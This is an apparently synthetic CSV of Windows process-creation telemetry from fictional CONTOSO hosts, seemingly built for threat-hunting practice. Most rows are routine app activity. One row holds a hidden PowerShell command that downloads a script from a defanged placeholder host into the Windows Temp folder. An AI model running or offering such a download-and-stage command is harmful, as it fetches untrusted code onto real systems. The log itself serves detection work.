Timestamp,DeviceId,DeviceName,FileName,FolderPath,ProcessCommandLine,SHA1,MD5,InitiatingProcessFileName,InitiatingProcessFolderPath,InitiatingProcessCommandLine,AccountName,ReportId
2025-09-21T08:37:55Z,0c3ea1f2-98c0-4b55-9f5c-324bca1d2bb1,WT4-JUMPBOX,python.exe,C:\Python312,"python.exe -c ""print(\'ok\')""",7777777777777777777777777777777777777777,4e07408562bedb8b60ce05c1decfe3ad,cmd.exe,C:\Windows\System32,"C:\Windows\System32\cmd.exe /c python -c ""print(\""ok\"")""",CONTOSO\admin,60101
2025-09-21T08:40:22Z,0c3ea1f2-98c0-4b55-9f5c-324bca1d2bb1,WT4-JUMPBOX,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,powershell.exe -nop -w hidden -c Invoke-WebRequest -Uri http://example[.]org/p.ps1 -OutFile C:\Windows\Temp\p.ps1,8888888888888888888888888888888888888888,6f4922f45568161a8cdf4ad2299f6d23,cmd.exe,C:\Windows\System32,C:\Windows\System32\cmd.exe /c powershell ...,CONTOSO\admin,60102
2025-09-21T08:43:46Z,5b0d1e7a-29cd-4707-8f8d-0e2d9a02b9cd,WT4-LAPTOP-02,python.exe,C:\Python312,python.exe -m http.server 8000,04f027017601b4079b75ce9766bc9b76bc95726b,f2b920237ea102b6ed2283787e3f0366,cmd.exe,C:\Windows\System32,C:\Windows\System32\cmd.exe /c python -m http.server 8000,CONTOSO\alex,60103
2025-09-21T08:45:35Z,c4e4a9f0-0f1b-4aa0-a9d2-6b7a9e2e55c1,WT4-DC-01,SearchApp.exe,C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy,SearchApp.exe,a16a506070f761f1274f2bbe157c45b8a5448b7b,7a0a8f8a820a8a5dec46c83c926eabea,svchost.exe,C:\Windows\System32,svchost.exe -k DcomLaunch,NT AUTHORITY\SYSTEM,60104
2025-09-21T08:49:55Z,1d2c3b4a-55e6-47a8-9fe1-01a2b3c4d5e6,WT4-ENG-WS,WINWORD.EXE,C:\Program Files\Microsoft Office\root\Office16,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" ""C:\Users\kevin\Documents\Plan.docx""",bc91d9eb8260eb460962ad5119fdb48b811a650b,ed23a29c57bb75a9d77b3b7e589b38d1,explorer.exe,C:\Windows,C:\Windows\explorer.exe,CONTOSO\eng,60105
2025-09-21T08:49:44Z,1d2c3b4a-55e6-47a8-9fe1-01a2b3c4d5e6,WT4-ENG-WS,chrome.exe,C:\Program Files\Google\Chrome\Application,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" https://contoso.com",fc2edac43d567c68bf3b8e5d63717dbb26ecd33d,97c925f64fd8342fc38b6b8312f9ad47,explorer.exe,C:\Windows,C:\Windows\explorer.exe,CONTOSO\eng,60106
2025-09-21T08:53:14Z,a77ba1f3-0a9f-4a39-a8f4-0e1b2a3c4d55,WT4-SRV-API,svchost.exe,C:\Windows\System32,svchost.exe -k netsvcs -p,f8f14a777808d64f366952bd376936bccfac6355,2cda2005464a11acb7b70784db76cdbc,services.exe,C:\Windows\System32,C:\Windows\System32\services.exe,IIS APPPOOL\DefaultAppPool,60107
2025-09-21T08:54:03Z,f19e6b2e-6a21-4200-8b70-5b1b05c6e3f9,WT4-LAB-01,ipconfig.exe,C:\Windows\System32,ipconfig.exe /all,c78debc4ca6da3badcaee34aa9980e398c59bd16,39d6a423002dc1eabdd56a2c68153d97,cmd.exe,C:\Windows\System32,C:\Windows\System32\cmd.exe /c ipconfig /all,CONTOSO\labuser,60108
2025-09-21T08:58:06Z,f19e6b2e-6a21-4200-8b70-5b1b05c6e3f9,WT4-LAB-01,OneDrive.exe,C:\Users\labuser\AppData\Local\Microsoft\OneDrive,OneDrive.exe /background,8d7e86239652ae521ffc81123c84b4195d2add39,5d294cdde6dfe338cf9e497a874b1c93,explorer.exe,C:\Windows,C:\Windows\explorer.exe,CONTOSO\labuser,60109
2025-09-21T09:00:49Z,f19e6b2e-6a21-4200-8b70-5b1b05c6e3f9,WT4-LAB-01,teams.exe,C:\Users\labuser\AppData\Local\Microsoft\Teams,teams.exe --process-start-args,54cc167ff53333bea36b87230299e461c26c492e,20b9828b9fee03bfa7c40d832e1e8b87,explorer.exe,C:\Windows,C:\Windows\explorer.exe,CONTOSO\labuser,60110
2025-09-21T09:01:15Z,1d2c3b4a-55e6-47a8-9fe1-01a2b3c4d5e6,WT4-ENG-WS,OneDrive.exe,C:\Users\eng\AppData\Local\Microsoft\OneDrive,OneDrive.exe /background,901ddcac4182ebef214c4a4caffa3391c108bd14,e5fbdb1669976836482aa495193ce44e,explorer.exe,C:\Windows,C:\Windows\explorer.exe,CONTOSO\eng,60111
2025-09-21T09:03:00Z,5b0d1e7a-29cd-4707-8f8d-0e2d9a02b9cd,WT4-LAPTOP-02,git.exe,C:\Program Files\Git\bin,git.exe status,ca4f03d76a95f2df493e820e28960e22597860d9,f3e07ea69c16693d637f7e95bc3f4c38,code.exe,C:\Users\alex\AppData\Local\Programs\Microsoft VS Code,code.exe --new-window,CONTOSO\alex,60112
2025-09-21T09:04:00Z,0c3ea1f2-98c0-4b55-9f5c-324bca1d2bb1,WT4-JUMPBOX,OneDriveStandaloneUpdater.exe,C:\Users\admin\AppData\Local\Microsoft\OneDrive\Update,OneDriveStandaloneUpdater.exe /silent,168e7c876dfe1088dc58efd50340c8d78e419d21,d59f0286be1a2de9ca9bb8ac69bbc8d6,OneDrive.exe,C:\Users\admin\AppData\Local\Microsoft\OneDrive,OneDrive.exe /background,CONTOSO\admin,60113
2025-09-21T09:06:55Z,a77ba1f3-0a9f-4a39-a8f4-0e1b2a3c4d55,WT4-SRV-API,services.exe,C:\Windows\System32,services.exe,1720dc50eb7e31000a3b9d4d7617880d4864b28a,bcad1121ce440bb040a891d0cd0ef51d,wininit.exe,C:\Windows\System32,C:\Windows\System32\wininit.exe,IIS APPPOOL\DefaultAppPool,60114
2025-09-21T09:07:39Z,f19e6b2e-6a21-4200-8b70-5b1b05c6e3f9,WT4-LAB-01,ipconfig.exe,C:\Windows\System32,ipconfig.exe /all,bc4a86076722e3d376a288a27350b1c5aaf9ca60,89aaafa5f1683648afad519b5859de58,cmd.exe,C:\Windows\System32,C:\Windows\System32\cmd.exe /c ipconfig /all,CONTOSO\labuser,60115
2025-09-21T09:09:35Z,1d2c3b4a-55e6-47a8-9fe1-01a2b3c4d5e6,WT4-ENG-WS,OneDrive.exe,C:\Users\eng\AppData\Local\Microsoft\OneDrive,OneDrive.exe /background,cb3474299b7dfe3f0ed6b5f07f8dfc3722dd75c9,833907ce2414158f9d77f5eab0800835,explorer.exe,C:\Windows,C:\Windows\explorer.exe,CONTOSO\eng,60116
2025-09-21T09:10:45Z,c4e4a9f0-0f1b-4aa0-a9d2-6b7a9e2e55c1,WT4-DC-01,EXCEL.EXE,C:\Program Files\Microsoft Office\root\Office16,"EXCEL.EXE ""C:\Users\alex\Documents\budget.xlsx""",c8172e681f179faab10495f8e138f615a1b2aaf3,e7fbe99ee0ec4b4c15fc7d80e0f808c8,explorer.exe,C:\Windows,C:\Windows\explorer.exe,NT AUTHORITY\SYSTEM,60117
2025-09-21T09:13:36Z,5b0d1e7a-29cd-4707-8f8d-0e2d9a02b9cd,WT4-LAPTOP-02,msedgewebview2.exe,C:\Program Files (x86)\Microsoft\EdgeWebView\Application,msedgewebview2.exe --type=utility,90f53f11fadfdeaae2d495ab87343e46a765c963,a48187af5406495b678fce5940902ab1,teams.exe,C:\Users\Public\AppData\Local\Microsoft\Teams,teams.exe,CONTOSO\alex,60118
2025-09-21T09:16:40Z,c4e4a9f0-0f1b-4aa0-a9d2-6b7a9e2e55c1,WT4-DC-01,whoami.exe,C:\Windows\System32,whoami.exe,65cbef5069b5c656804d1449c3d8e3835d5d1870,830a4e900c6a044cc7d92d8c1cc8ec1d,cmd.exe,C:\Windows\System32,C:\Windows\System32\cmd.exe /c whoami,NT AUTHORITY\SYSTEM,60119
2025-09-21T09:18:19Z,dbb2c8f4-44c1-4d3a-8a1a-0d9f5d9b1a01,WT4-LAPTOP-01,WINWORD.EXE,C:\Program Files\Microsoft Office\root\Office16,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" ""C:\Users\kevin\Documents\Plan.docx""",59aa835bb3e26b0e599296b3fd65baca9b0063d1,ea391b8c6541f4bbb6eeec49d332d16f,explorer.exe,C:\Windows,C:\Windows\explorer.exe,CONTOSO\kevin,60120
2025-09-21T09:20:06Z,1d2c3b4a-55e6-47a8-9fe1-01a2b3c4d5e6,WT4-ENG-WS,explorer.exe,C:\Windows,C:\Windows\explorer.exe,b3c8468415a5c3750c15fbc6ce9f6e1fefd5750d,2f29911791750d0c88a9cd7bd55e92ed,userinit.exe,C:\Windows\System32,C:\Windows\System32\userinit.exe,CONTOSO\eng,60121
2025-09-21T09:23:17Z,dbb2c8f4-44c1-4d3a-8a1a-0d9f5d9b1a01,WT4-LAPTOP-01,git.exe,C:\Program Files\Git\bin,git.exe status,3a33fca33d4ef89ee04c550a1a78d46aa1d4f788,bcab887758b0c19a052a843eb637b0fc,code.exe,C:\Users\kevin\AppData\Local\Programs\Microsoft VS Code,code.exe --new-window,CONTOSO\kevin,60122
2025-09-21T09:24:58Z,0c3ea1f2-98c0-4b55-9f5c-324bca1d2bb1,WT4-JUMPBOX,RuntimeBroker.exe,C:\Windows\System32,RuntimeBroker.exe -Embedding,bb12fd34181fc0ff665b568106b641a63ad8a990,819901db671aa893f6a7e95d95f03126,svchost.exe,C:\Windows\System32,svchost.exe -k RPCSS,CONTOSO\admin,60123
2025-09-21T09:26:38Z,dbb2c8f4-44c1-4d3a-8a1a-0d9f5d9b1a01,WT4-LAPTOP-01,OUTLOOK.EXE,C:\Program Files\Microsoft Office\root\Office16,OUTLOOK.EXE /recycle,28c843e3f416acd1f1ef89380b3121d9659ab76a,344bf383ea075306b50b6e5aa266af4c,explorer.exe,C:\Windows,C:\Windows\explorer.exe,CONTOSO\kevin,60124
2025-09-21T09:29:14Z,5b0d1e7a-29cd-4707-8f8d-0e2d9a02b9cd,WT4-LAPTOP-02,node.exe,C:\Program Files\nodejs,node.exe server.js,02c60c05095766c264c042d0b8858340a826689c,4cfdfe462b92d2b49a71f5406334edab,cmd.exe,C:\Windows\System32,C:\Windows\System32\cmd.exe /c node server.js,CONTOSO\alex,60125
2025-09-21T09:30:25Z,0c3ea1f2-98c0-4b55-9f5c-324bca1d2bb1,WT4-JUMPBOX,OUTLOOK.EXE,C:\Program Files\Microsoft Office\root\Office16,OUTLOOK.EXE /recycle,dbce3c4f009f906e6c46a0c3faacaaae84776e54,8a7632a924438f4a0bb5c63f0190f6fc,explorer.exe,C:\Windows,C:\Windows\explorer.exe,CONTOSO\admin,60126
2025-09-21T09:32:55Z,c4e4a9f0-0f1b-4aa0-a9d2-6b7a9e2e55c1,WT4-DC-01,msedgewebview2.exe,C:\Program Files (x86)\Microsoft\EdgeWebView\Application,msedgewebview2.exe --type=utility,f7ba77b11dd99688355659e841148e25c8c3f98d,94212a8be718fd4f6323cb41ba9e4cb5,teams.exe,C:\Users\Public\AppData\Local\Microsoft\Teams,teams.exe,NT AUTHORITY\SYSTEM,60127
2025-09-21T09:35:22Z,c4e4a9f0-0f1b-4aa0-a9d2-6b7a9e2e55c1,WT4-DC-01,code.exe,C:\Users\SYSTEM\AppData\Local\Programs\Microsoft VS Code,code.exe --new-window,8208722ed56a99db272f9724ef5c2ad0f73744e8,b2dc3a315258d90a8ce70fb34277be0f,explorer.exe,C:\Windows,C:\Windows\explorer.exe,NT AUTHORITY\SYSTEM,60128
2025-09-21T09:38:52Z,1d2c3b4a-55e6-47a8-9fe1-01a2b3c4d5e6,WT4-ENG-WS,msedgewebview2.exe,C:\Program Files (x86)\Microsoft\EdgeWebView\Application,msedgewebview2.exe --type=utility,7138cee3c7549133cfa33f3061a9e01a1b1e7997,cdbb35821ee069281c9f7c38330eab86,teams.exe,C:\Users\Public\AppData\Local\Microsoft\Teams,teams.exe,CONTOSO\eng,60129
2025-09-21T09:40:03Z,a77ba1f3-0a9f-4a39-a8f4-0e1b2a3c4d55,WT4-SRV-API,msiexec.exe,C:\Windows\System32,"msiexec.exe /i ""C:\Temp\agent.msi"" /qn",9f7547ec62398bd48538712aa6541598d438220b,3fc803e9bf353cef9375592a955f1b09,explorer.exe,C:\Windows,C:\Windows\explorer.exe,IIS APPPOOL\DefaultAppPool,60130
2025-09-21T09:42:29Z,5b0d1e7a-29cd-4707-8f8d-0e2d9a02b9cd,WT4-LAPTOP-02,Slack.exe,C:\Users\alex\AppData\Local\slack,slack.exe --squirrel-firstrun,28324d42131e2512b22f04f438257e39ddf11ab7,d444a6dc0e296f955e744b93cd2d5773,explorer.exe,C:\Windows,C:\Windows\explorer.exe,CONTOSO\alex,60131
2025-09-21T09:43:09Z,f19e6b2e-6a21-4200-8b70-5b1b05c6e3f9,WT4-LAB-01,nslookup.exe,C:\Windows\System32,nslookup.exe contoso.com,8f7df471b0fdff85b7b2c7c44c84057e47d9d2fa,35d648f232e086aa2373d18e9faf68e9,cmd.exe,C:\Windows\System32,C:\Windows\System32\cmd.exe /c nslookup contoso.com,CONTOSO\labuser,60132
2025-09-21T09:45:29Z,5b0d1e7a-29cd-4707-8f8d-0e2d9a02b9cd,WT4-LAPTOP-02,git.exe,C:\Program Files\Git\bin,git.exe status,4be9a50abb114dd355d7284a1e87b031476a6c7f,7dc81c3015965bca071f38616be0cad7,code.exe,C:\Users\alex\AppData\Local\Programs\Microsoft VS Code,code.exe --new-window,CONTOSO\alex,60133
2025-09-21T09:47:07Z,0c3ea1f2-98c0-4b55-9f5c-324bca1d2bb1,WT4-JUMPBOX,OneDrive.exe,C:\Users\admin\AppData\Local\Microsoft\OneDrive,OneDrive.exe /background,da399189306c0dae1ac4ce81348924e4d6cbb568,5d91445891ad096365d7d0259aa10be2,explorer.exe,C:\Windows,C:\Windows\explorer.exe,CONTOSO\admin,60134
2025-09-21T09:50:52Z,0c3ea1f2-98c0-4b55-9f5c-324bca1d2bb1,WT4-JUMPBOX,msedge.exe,C:\Program Files (x86)\Microsoft\Edge\Application,"""""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""" --profile-directory=Default",eb1dd2ecd6986e77bd463caf8f893ae8f92a877b,6b40945cf01883e29906b4f0cb04332f,explorer.exe,C:\Windows,C:\Windows\explorer.exe,CONTOSO\admin,60135
2025-09-21T09:51:32Z,1d2c3b4a-55e6-47a8-9fe1-01a2b3c4d5e6,WT4-ENG-WS,wuauclt.exe,C:\Windows\System32,wuauclt.exe /reportnow,26b30b8657b33134c42b1e721567f46c23acff5f,1ec062f4ee360e524553e382cda5dd59,svchost.exe,C:\Windows\System32,svchost.exe -k netsvcs,CONTOSO\eng,60136
2025-09-21T09:52:43Z,0c3ea1f2-98c0-4b55-9f5c-324bca1d2bb1,WT4-JUMPBOX,git.exe,C:\Program Files\Git\bin,git.exe status,581b078dc13a82d5b606a4889c312f98022e736a,87f185059fe9fa4253e7e349c28529a2,code.exe,C:\Users\admin\AppData\Local\Programs\Microsoft VS Code,code.exe --new-window,CONTOSO\admin,60137
2025-09-21T09:55:08Z,a77ba1f3-0a9f-4a39-a8f4-0e1b2a3c4d55,WT4-SRV-API,node.exe,C:\Program Files\nodejs,node.exe server.js,e0906bd7df180261847ba8ff53ee73630c871833,a87187b4dd834bfd28f5eaac8c6d375d,cmd.exe,C:\Windows\System32,C:\Windows\System32\cmd.exe /c node server.js,IIS APPPOOL\DefaultAppPool,60138
2025-09-21T09:55:56Z,a77ba1f3-0a9f-4a39-a8f4-0e1b2a3c4d55,WT4-SRV-API,OneDrive.exe,C:\Users\DefaultAppPool\AppData\Local\Microsoft\OneDrive,OneDrive.exe /background,42360840352938da67d713b4b92dde9ed56653d8,ca9cb93e9487c3a3964eef06474d484b,explorer.exe,C:\Windows,C:\Windows\explorer.exe,IIS APPPOOL\DefaultAppPool,60139
2025-09-21T09:58:44Z,f19e6b2e-6a21-4200-8b70-5b1b05c6e3f9,WT4-LAB-01,wuauclt.exe,C:\Windows\System32,wuauclt.exe /reportnow,3fe0c69f9141474375df7942707e9c61b2549a3c,bbdb090cb1b7c63dd7ce1c149e10ca80,svchost.exe,C:\Windows\System32,svchost.exe -k netsvcs,CONTOSO\labuser,60140
2025-09-21T10:00:15Z,1d2c3b4a-55e6-47a8-9fe1-01a2b3c4d5e6,WT4-ENG-WS,code.exe,C:\Users\eng\AppData\Local\Programs\Microsoft VS Code,code.exe --new-window,9759faedada5b6fe8c8fcc0cf8828ed9c73fcd1a,e842e580943cb1abc7710b3bc3a5b1dc,explorer.exe,C:\Windows,C:\Windows\explorer.exe,CONTOSO\eng,60141
2025-09-21T10:04:07Z,1d2c3b4a-55e6-47a8-9fe1-01a2b3c4d5e6,WT4-ENG-WS,teams.exe,C:\Users\eng\AppData\Local\Microsoft\Teams,teams.exe --process-start-args,24293ae534977d891c655848ee6b8041518aa020,2531a0ec3b731cb50e131056d4825aee,explorer.exe,C:\Windows,C:\Windows\explorer.exe,CONTOSO\eng,60142
